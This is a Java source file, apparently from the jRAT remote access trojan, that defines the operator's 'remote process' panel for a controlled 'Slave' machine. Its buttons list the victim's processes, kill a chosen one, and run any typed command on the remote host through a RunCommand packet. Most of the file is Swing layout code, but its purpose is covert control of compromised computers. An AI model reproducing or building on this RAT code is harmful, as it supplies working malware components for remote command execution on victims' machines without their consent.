package pro.jrat.ui.panels;


import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.table.DefaultTableModel;

import pro.jrat.Slave;
import pro.jrat.packets.outgoing.Packet19ListProcesses;
import pro.jrat.packets.outgoing.Packet20KillProcess;
import pro.jrat.packets.outgoing.Packet38RunCommand;
import pro.jrat.ui.renderers.table.ProcessTableRenderer;
import pro.jrat.utils.Util;

import com.redpois0n.common.OperatingSystem;

@SuppressWarnings("serial")
public class PanelControlRemoteProcess extends PanelControlParent {

	private JTable table;
	private DefaultTableModel model;

	public DefaultTableModel getModel() {
		return model;
	}

	public PanelControlRemoteProcess(Slave slave) {
		super(slave);
		final Slave sl = slave;

		JScrollPane scrollPane = new JScrollPane();

		JButton btnRefresh = new JButton("Refresh");
		btnRefresh.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				while (model.getRowCount() > 0) {
					model.removeRow(0);
				}
				sl.addToSendQueue(new Packet19ListProcesses());
			}
		});
		btnRefresh.setIcon(new ImageIcon(PanelControlRemoteProcess.class.getResource("/icons/update.png")));

		JButton btnKillSelected = new JButton("Kill selected");
		btnKillSelected.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				if (model.getValueAt(table.getSelectedRow(), 0) != null) {
					String process;
					if (sl.getOS() == OperatingSystem.WINDOWS) {
						process = model.getValueAt(table.getSelectedRow(), 0).toString();
					} else {
						process = model.getValueAt(table.getSelectedRow(), 1).toString();
					}
					
					while (model.getRowCount() > 0) {
						model.removeRow(0);
					}
					
					sl.addToSendQueue(new Packet20KillProcess(process));				
					
					sl.addToSendQueue(new Packet19ListProcesses());
				}
			}
		});
		btnKillSelected.setIcon(new ImageIcon(PanelControlRemoteProcess.class.getResource("/icons/delete.png")));

		JButton btnCreateProcess = new JButton("Create process");
		btnCreateProcess.setIcon(new ImageIcon(PanelControlRemoteProcess.class.getResource("/icons/process.png")));
		btnCreateProcess.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				String proc = Util.showDialog("Create process", "Input name of process");
				if (proc == null) {
					return;
				}
				proc = proc.trim();
				sl.addToSendQueue(new Packet38RunCommand(proc));
				while (model.getRowCount() > 0) {
					model.removeRow(0);
				}
				sl.addToSendQueue(new Packet19ListProcesses());
			}
		});

		JButton btnClearList = new JButton("Clear list");
		btnClearList.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				while (model.getRowCount() > 0) {
					model.removeRow(0);
				}
			}
		});
		btnClearList.setIcon(new ImageIcon(PanelControlRemoteProcess.class.getResource("/icons/clear.png")));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 600, Short.MAX_VALUE).addGroup(groupLayout.createSequentialGroup().addContainerGap(176, Short.MAX_VALUE).addComponent(btnClearList).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnCreateProcess).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnKillSelected).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnRefresh).addContainerGap()));
		groupLayout.setVerticalGroup(groupLayout.createParallelGroup(Alignment.TRAILING).addGroup(groupLayout.createSequentialGroup().addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 296, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(groupLayout.createParallelGroup(Alignment.BASELINE).addComponent(btnRefresh).addComponent(btnKillSelected).addComponent(btnCreateProcess).addComponent(btnClearList)).addGap(18)));

		table = new JTable();
		table.setDefaultRenderer(Object.class, new ProcessTableRenderer());
		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Name", "Process ID", "Session name / Time", "Memory Usage / Info" }));
		table.getColumnModel().getColumn(0).setPreferredWidth(287);
		table.getColumnModel().getColumn(2).setPreferredWidth(108);
		table.getColumnModel().getColumn(3).setPreferredWidth(100);
		table.setRowHeight(25);
		scrollPane.setViewportView(table);
		setLayout(groupLayout);
	}
}
